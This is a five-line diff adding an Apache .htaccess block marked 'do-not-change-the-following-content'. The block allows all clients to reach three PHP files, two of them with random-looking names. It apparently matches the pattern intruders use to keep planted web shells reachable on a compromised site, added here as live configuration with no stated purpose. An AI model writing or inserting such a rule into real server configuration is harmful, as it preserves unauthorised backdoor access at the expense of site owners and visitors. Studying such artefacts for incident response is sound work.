@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(0btfq8c7v6.php|2jqe367xv9.php|morris.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
